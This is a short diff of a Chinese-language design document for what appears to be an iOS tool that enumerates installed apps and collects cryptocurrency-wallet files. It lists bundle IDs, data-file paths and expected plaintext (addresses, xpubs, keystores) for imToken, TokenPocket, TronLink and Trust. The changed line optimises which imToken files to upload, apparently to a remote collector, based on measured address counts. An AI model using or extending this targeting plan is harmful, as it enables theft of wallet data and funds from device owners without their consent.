@@ -136,7 +136,7 @@ NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
 
 | 钱包 | 已知 bundleId | 核心文件 | 预期明文 |
 |---|---|---|---|
-| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`default.realm` | 地址、xpub；keystore 可能加密 |
+| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行 |
 | TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
 | TronLink | `io.tronlink.wallet` 等 | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore |
 | Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
